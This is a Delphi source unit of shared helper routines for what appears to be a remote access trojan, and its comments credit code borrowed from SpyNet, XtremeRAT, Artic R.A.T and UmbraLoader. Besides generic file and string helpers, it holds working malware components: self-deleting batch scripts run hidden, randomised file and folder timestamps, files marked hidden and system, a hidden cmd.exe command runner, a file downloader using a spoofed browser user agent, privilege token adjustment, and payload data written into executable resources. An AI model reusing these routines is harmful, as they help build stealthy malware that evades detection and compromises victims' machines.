unit UnitUtils; //all useful functions and procedure share or not by server and client go here

interface

uses
  Windows, SysUtils, ShellAPI, WinInet;
   
type
  TStringArray = array of string;

function RandomString(Count: Integer): string;
function StringCount(Delim, Str: string): Integer;
function ParseString(Delim, Str: string): TStringArray;
function ReadKeyString(Key:HKEY; Path:string; Value, Default: string): string;
function FileSizeToStr(Bytes: Int64): string;
function MyGetFileSize(Filename: string): Int64;
function MyShellExecute(FileName, Parameters: string; ShowCmd: Integer): Cardinal;
function MyStartThread(pFunction: Pointer; Params: Pointer = nil): Cardinal;
function MyCreateFile(Filename: string): Boolean;
function MyWriteFile(Filename, Buffer: string; BufferSize: Cardinal): Boolean;
function MyReadFile(Filename: string): string;
function GetActiveCaption: string;
function MyListFiles(Path: string; var Count: Integer): TStringArray;
procedure ProcessMessages; //to keep statibility!
function DeleteAllFilesAndDir(FilesOrDir: string): Boolean;
function MyShowMessage(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
function MyURLDownloadFile(Url, FileName: string): Boolean;
function AppDataDir: string; //installation location
function TmpDir: string;
function RootDir: string;
function SysDir: string;
function WinDir: string;
function MyExecuteShellCommand(Cmd: string): Boolean;
function ExtractURLFile(Url: string): string;
procedure SetTokenPrivileges(Priv: string);
function MyReplaceStr(const Str, OldStr, NewStr: string): string;
function WriteResData(Filename: string; pFile: pointer; Size: Integer; Name: String): Boolean;
function GetResourceAsString(pSectionName: pchar): string;
procedure ChangeDirTime(DirName: string);
procedure ChangeFileTime(FileName: string);
procedure HideFileName(FileName: string);
procedure MySelfDelete;
procedure MySelfDeleteFolder;
function CreatePath(Path: string): Boolean;
function GetBrowser: string;

implementation
                         
function GetBrowser: string; //get default browser file path
var
  B: array[0..255] of Char;
  hFile: Cardinal;
begin
  hFile := CreateFile(PChar(Tmpdir + 'tmp.htm'), GENERIC_WRITE, 0, nil, CREATE_ALWAYS, 0, 0);
  CloseHandle(hFile);
  FindExecutable(PChar(Tmpdir + 'tmp.htm'), '', B);
  DeleteFile(PChar(Tmpdir + 'tmp.htm'));
  Result := B;
end;

//From SpyNet 2.7 source code
function CreatePath(Path: string): Boolean;
var
  TempStr, TempDir: string;
begin
  result := false;
  if Path = '' then exit;
  if DirectoryExists(Path) = true then
  begin
    Result := true;
    Exit;
  end;

  TempStr := Path;
  if TempStr[length(TempStr)] <> '\' then TempStr := TempStr + '\';

  while pos('\', TempStr) >= 1 do
  begin
    TempDir := TempDir + copy(TempStr, 1, pos('\', TempStr));
    delete(Tempstr, 1, pos('\', TempStr));
    if DirectoryExists(TempDir) = False then
    if Createdirectory(pchar(TempDir), nil) = False then Exit;
  end;

  Result := DirectoryExists(Path);
end;

//by wrh1d3
procedure MySelfDeleteFolder;
var
  TmpStr, TmpFile: string;
begin
  TmpFile := TmpDir + IntToStr(GetTickCount) + '.bat';

  TmpStr := ':f' + #13#10;
  TmpStr := TmpStr + 'attrib -R -A -S -H "' + ExtractFilePath(ParamStr(0)) + '"' + #13#10;
  TmpStr := TmpStr + 'rmdir "' + ExtractFilePath(ParamStr(0)) + '"' + #13#10;
  TmpStr := TmpStr + 'if EXIST "' + ExtractFilePath(ParamStr(0)) + '" goto f' + #13#10;
  TmpStr := TmpStr + 'del "' + TmpFile + '"' + #13#10;
  TmpStr := TmpStr + 'del %0';

  MyCreateFile(TmpFile);
  MyWriteFile(TmpFile, TmpStr, Length(TmpStr));

  MyShellExecute(PChar(TmpFile), '', SW_HIDE);
end;

procedure MySelfDelete;
var
  TmpStr, TmpFile: string;
begin
  TmpFile := TmpDir + IntToStr(GetTickCount) + '.bat';

  TmpStr := ':f' + #13#10;
  TmpStr := TmpStr + 'attrib -R -A -S -H "' + ParamStr(0) + '"' + #13#10;
  TmpStr := TmpStr + 'del "' + ParamStr(0) + '"' + #13#10;
  TmpStr := TmpStr + 'if EXIST "' + ParamStr(0) + '" goto f' + #13#10;
  TmpStr := TmpStr + 'del "' + TmpFile + '"' + #13#10;
  TmpStr := TmpStr + 'del %0';

  MyCreateFile(TmpFile);
  MyWriteFile(TmpFile, TmpStr, Length(TmpStr));

  MyShellExecute(PChar(TmpFile), '', SW_HIDE);
end;

procedure HideFileName(FileName: string);
var
  i: cardinal;
begin
  i := GetFileAttributes(PChar(FileName));
  i := i or faReadOnly;
  i := i or faHidden;
  i := i or faSysFile;
  SetFileAttributes(PChar(FileName), i);
end;

procedure ChangeFileTime(FileName: string);
var
  SHandle: THandle;
  MyFileTime : TFileTime;
begin
  randomize;
  MyFileTime.dwLowDateTime := 29700000 + random(99999);
  MyFileTime.dwHighDateTime:= 29700000 + random(99999);

  SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if SHandle = INVALID_HANDLE_VALUE then
  begin
    CloseHandle(sHandle);
    SHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if SHandle <> INVALID_HANDLE_VALUE then
    SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
    CloseHandle(sHandle);
  end
  else SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
  CloseHandle(sHandle);
end;

procedure ChangeDirTime(DirName: string);
var
  h: THandle;
  ft: TFileTime;
begin
  ft.dwLowDateTime := 29700000 + random(99999);
  ft.dwHighDateTime:= 29700000 + random(99999);

  h:= CreateFile(PChar(DirName), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0);

  if h <> INVALID_HANDLE_VALUE then
  begin
    SetFileTime(h, nil, @ft, nil); // last access
    SetFileTime(h, nil, nil, @ft);  // last write
    SetFileTime(h, @ft, nil, nil);   // creation
  end;

  CloseHandle(h);
end;

//p0ke mods by cswi
function GetResources(pSectionName: PChar; out ResourceSize: LongWord): Pointer;
var
  ResourceLocation: Cardinal;
  ResourceHandle: Cardinal;
begin
  ResourceLocation := FindResourceA(hInstance, PAnsiChar(pSectionName), PAnsiChar(10));
  ResourceSize := SizeofResource(hInstance, ResourceLocation);   
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
end;
        
//p0ke mods by cswi
function GetResourceAsString(pSectionName: pchar): string;
var
  ResourceData: PChar;
  SResourceSize: LongWord;
begin
  ResourceData := GetResources(pSectionName, SResourceSize);
  SetString(Result, ResourceData, SResourceSize);
end;

//P0ke
function WriteResData(Filename: string; pFile: pointer; Size: Integer; Name: String): Boolean;
var
  hResourceHandle: THandle;
  pwServerFile: PWideChar;
  pwName: PWideChar;
begin
  GetMem(pwServerFile, (Length(Filename) + 1) * 2);
  GetMem(pwName, (Length(Name) + 1) *2);
  try
    StringToWideChar(Filename, pwServerFile, Length(Filename) * 2);
    StringToWideChar(Name, pwName, Length(Name) * 2);
    hResourceHandle := BeginUpdateResourceW(pwServerFile, False);
    Result := UpdateResourceW(hResourceHandle, MakeIntResourceW(10), pwName, 0, pFile, Size);
    EndUpdateResourceW(hResourceHandle, False);
  finally
    FreeMem(pwServerFile);
    FreeMem(pwName);
  end;
end;

function MyReplaceStr(const Str, OldStr, NewStr: string): string;
var
  i: Integer;
  TmpStr, S: string;
  oStr, nStr: string;
begin
  S := Str;
  Result := S;
  oStr := OldStr;
  nStr := NewStr;
  TmpStr := '';
  if Pos(OldStr, S) <= 0 then Exit;

  repeat
    i := Pos(oStr, S);
    if i > 0 then
    begin
      TmpStr := TmpStr + Copy(S, 1, i - 1);
      TmpStr := TmpStr + nStr;
      S := Copy(S, i + Length(oStr), Length(S));
    end
    else TmpStr := TmpStr + S;
  until i = 0;

  Result := TmpStr;
end;

procedure SetTokenPrivileges(Priv: string);
var
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, Pchar(Priv), TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;

//From Artic R.A.T
function ExtractURLFile(Url: string): string;
var
  i, iLast, iFirst: Integer;
begin
  iLast := Length(Url) + 1;
  iFirst := 1;

  for i := Length(Url) downto 1 do
  begin
    if Url[i] = '/' then
    begin
      iFirst:= i + 1;
      Break;
    end
    else if Url[i] = '?' then iLast := i;
  end;

  Result := Copy(Url, iFirst, iLast - iFirst);
end;

//by wrh1d3
function MyExecuteShellCommand(Cmd: string): Boolean;
var
  SI: TStartupInfo;
  PI: TProcessInformation;
begin
  FillChar(SI, SizeOf(SI), 0);
  SI.cb := SizeOf(SI);
  SI.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  SI.wShowWindow := SW_HIDE;
  SI.hStdInput := GetStdHandle(STD_INPUT_HANDLE);
  Result := CreateProcess(nil, PChar('cmd.exe /C ' + Cmd), nil, nil, True, 0, nil, PChar('C:\'), SI, PI);
end;
             
function SHGetSpecialFolderPath(hwndOwner: HWND; lpszPath: PAnsiChar;
  nFolder: Integer; fCreate: BOOL): BOOL; stdcall; external 'shell32.dll' name 'SHGetSpecialFolderPathA'
    
function GetSpecialFolder(const CSIDL : integer): string;
var
  RecPath: array[0..255] of Char;
begin
  Result := '';
  if SHGetSpecialFolderPath(0, RecPath, CSIDL, false) then Result := RecPath;
  if Result[Length(Result)] <> '\' then Result := Result + '\';
end;

function AppDataDir: string;
begin
  Result := GetSpecialFolder($001A);
end;

function TmpDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;
       
function WinDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

function RootDir: string;
begin
  Result := Copy(WinDir, 1, 3);
end;

function SysDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

//From UmbraLoader 1.1.1 , modified by wrh1d3 :)
//-----
function MyURLDownloadFile(Url, FileName: string): Boolean;
var
  hInet, hFile: HINTERNET;
  fHandle, dWrite: Cardinal;
  Buffer: array[1..1024] of Byte;
  bRead: DWORD;
begin
  Result := False;      //set user agent 
  hInet := InternetOpen('Mozilla/4.0', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
  hFile := InternetOpenURL(hInet, PChar(Url), nil, 0, 0, 0);
  if not Assigned(hFile) then Exit;
  fHandle := CreateFile(PChar(FileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
  if fHandle = INVALID_HANDLE_VALUE then  Exit;
  repeat
    InternetReadFile(hFile, @Buffer, SizeOf(Buffer), bRead);
    WriteFile(fHandle, Buffer[1], bRead, dWrite, nil);
  until bRead = 0;
  CloseHandle(fHandle);
  InternetCloseHandle(hFile);
  InternetCloseHandle(hInet);
  Result := True;
end;
//-----

//From XtremeRAT 3.6 source code
//-----
function DeleteAllFilesAndDir(FilesOrDir: string): Boolean;
var
  F: TSHFileOpStruct;
  From: string;
  Resultval: integer;
begin
  FillChar(F, SizeOf(F), #0);
  From := FilesOrDir + #0;
  try
    F.wnd := 0;
    F.wFunc := FO_DELETE;
    F.pFrom := PChar(From);
    F.pTo := nil;
    F.fFlags := F.fFlags or FOF_NOCONFIRMATION  or FOF_SIMPLEPROGRESS or FOF_FILESONLY or FOF_NOERRORUI;
    F.fAnyOperationsAborted := False;
    F.hNameMappings := nil;
    Resultval := ShFileOperation(F);
    Result := (ResultVal = 0);
  finally
  end;
end;

function xProcessMessage(var Msg: TMsg): Boolean;
begin
  Result := False;
  if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
  begin
    Result := True;
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;

  Sleep(5);
end;

procedure ProcessMessages;
var
  Msg: TMsg;
begin
  while xProcessMessage(Msg) do ;
end;
//-----

//by wrh1d3
function MyListFiles(Path: string; var Count: Integer): TStringArray;
var
  SchRec: TSearchRec;
  i: Integer;
begin
  if Path[Length(Path)] <> '\' then Path := Path + '\';
  if FindFirst(Path + '*.*', faAnyFile, SchRec) <> 0 then Exit;

  SetLength(Result, 100); //100 is an good number 
  i := 0;
  
  repeat
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;
    Result[i] := SchRec.Name;
    Inc(i);
  until FindNext(SchRec) <> 0;
  
  FindClose(SchRec);
  Count := i;
end;

function GetActiveCaption: string;
var
  Title: array [0..260] of Char;
begin
  GetWindowText(GetForegroundWindow, Title, SizeOf(Title));
  Result := Title;
end;

function MyReadFile(Filename: string): string;
var
  hFile: THandle;
  dSize, dRead: DWORD;
begin
  Result := '';
  hFile := CreateFile(PChar(Filename), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile = 0 then Exit;
  dSize := GetFileSize(hFile, nil);
  if dSize = 0 then Exit;
  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  SetLength(Result, dSize);
  ReadFile(hFile, Result[1], dSize, dRead, nil);
  CloseHandle(hFile);
end;

function MyCreateFile(Filename: string): Boolean;
var
  hFile: Cardinal;
begin
  hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
  Result := hFile <> INVALID_HANDLE_VALUE;
  CloseHandle(hFile);
end;
  
function MyWriteFile(Filename, Buffer: string; BufferSize: Cardinal): Boolean;
var
  hFile, i: Cardinal;
begin
  Result := False;
  hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, OPEN_ALWAYS, 0, 0);
  if hFile = INVALID_HANDLE_VALUE then Exit;
  SetFilePointer(hFile, 0, nil, FILE_END);
  WriteFile(hFile, Buffer[1], BufferSize, i, nil);
  CloseHandle(hFile);
  Result := True;
end;

//by wrh1d3
function MyShowMessage(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
begin
  case mType of
    0: mType := MB_ICONERROR;
    1: mType := MB_ICONINFORMATION;
    2: mType := MB_ICONQUESTION;
    3: mType := MB_ICONWARNING;
  else
    mType := 0;
  end;

  case bType of
    0: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OK);
    1: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OKCANCEL);
    2: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNO);
    3: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNOCANCEL);
    4: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_RETRYCANCEL);
    5: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_ABORTRETRYIGNORE);
  end;
end;

function MyStartThread(pFunction: Pointer; Params: Pointer): Cardinal;
var
  hThread: THandle;
begin
  Result := CreateThread(nil, 0, pFunction, Params, 0, hThread);
  SetThreadPriority(Result, 0);
end;

function ShellExecute(hWnd: Cardinal; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): Cardinal; stdcall;
  external 'shell32.dll' name 'ShellExecuteA';

function MyShellExecute(FileName, Parameters: string; ShowCmd: Integer): Cardinal;
begin
  Result := ShellExecute(0, 'open', PChar(FileName), PChar(Parameters), nil, ShowCmd);
end;

function MyGetFileSize(Filename: string): Int64;
var
  hFile: THandle;
begin
  hFile := CreateFile(PChar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  Result := GetFileSize(hFile, nil);
  CloseHandle(hFile);
end;

function FileSizeToStr(Bytes: Int64): string;
var
  dB, dKB, dMB, dGB, dT: integer;
begin
  Result := '0 Byte';
  if Bytes <= 0 then Exit;

  dB := Bytes;
  dKB := 0;
  dMB := 0;
  dGB := 0;
  dT  := 0;

  while (dB > 1024) do
  begin
    inc(dKB, 1);
    dec(dB , 1024);
    dT := 1;
  end;

  while (dKB > 1024) do
  begin
    inc(dMB, 1);
    dec(dKB, 1024);
    dT := 2;
  end;

  while (dMB > 1024) do
  begin
    inc(dGB, 1);
    dec(dMB, 1024);
    dT := 3;
  end;

  case dT of
    0: Result := IntToStr(dB) + ' Bytes';
    1: Result := IntToStr(dKB) + '.' + copy(IntToStr(dB ), 1, 2) + ' KB';
    2: Result := IntToStr(dMB) + '.' + copy(IntToStr(dKB), 1, 2) + ' MB';
    3: Result := IntToStr(dGB) + '.' + copy(IntToStr(dMB), 1, 2) + ' GB';
  end;
end;

function ReadKeyString(Key:HKEY; Path:string; Value, Default: string): string;
Var
  Handle:hkey;
  RegType, DataSize: Integer;
begin
  Result := Default;
  if (RegOpenKeyEx(Key, pchar(Path), 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Handle, pchar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Handle, pchar(Value), nil, @RegType, PByte(pchar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Handle);
  end;
end;

//From XtremeRAT 3.6 source code
function StringCount(Delim, Str: string): Integer;
var
  _Str: string;
begin
  Result := 0;
  _Str := Str;

  while Pos(Delim, _Str) > 0 do
  begin
    Inc(Result);
    Delete(_Str, 1, Pos(Delim, _Str));
  end;
end;

//by wrh1d3
function ParseString(Delim, Str: string): TStringArray;
var
  Count, i: Integer;
begin
  i := 0;
  if Pos(Delim, Str) <= 0 then Exit;
  
  Count := StringCount(Delim, Str);
  SetLength(Result, Count); //set TStringArray length before 

  while (Str <> '') and (i <= Count) do
  begin
    Result[i] := Copy(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Length(Delim));
    Inc(i);
  end;
end;

function RandomString(Count: Integer): string;
const
  TmpStr = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ';
var
  i: Integer;
begin
  Randomize;
  for i := 0 to Count do Result := Result + TmpStr[Random(Length(TmpStr)) + 1];
end;

end.
